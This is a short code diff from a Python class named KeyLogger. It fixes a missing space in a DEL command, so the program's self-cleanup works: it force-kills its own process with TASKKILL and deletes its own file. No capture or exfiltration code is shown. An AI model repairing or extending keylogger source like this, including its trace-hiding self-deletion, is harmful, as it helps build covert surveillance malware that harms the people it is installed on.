@@ -101,7 +101,7 @@ class KeyLogger:
                 os.system("cd " + pwd)
                 os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                 print('File was closed.')
-                os.system("DEL" + os.path.basename(__file__))
+                os.system("DEL " + os.path.basename(__file__))
             except OSError:
                 print('File is close.')
                 
